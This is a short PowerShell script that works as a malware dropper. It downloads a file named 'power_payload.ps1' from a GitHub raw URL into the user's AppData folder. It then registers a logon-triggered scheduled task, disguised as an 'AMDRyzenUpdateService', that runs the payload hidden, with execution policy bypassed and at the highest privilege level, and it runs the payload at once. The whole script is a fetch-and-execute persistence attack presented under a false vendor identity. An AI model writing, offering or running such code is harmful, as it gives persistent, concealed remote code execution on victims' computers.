$Path = "$env:APPDATA\AMD_Service_Task.ps1"
$PayloadUrl = "https://raw.githubusercontent.com/powderedLamb40/Script-pp/refs/heads/main/power_payload.ps1"

(New-Object Net.WebClient).DownloadFile($PayloadUrl, $Path)

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$Path`""

$Trigger = New-ScheduledTaskTrigger -AtLogon

Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "AMDRyzenUpdateService" -Description "AMD Service Update Task" -RunLevel Highest -Force

powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path"
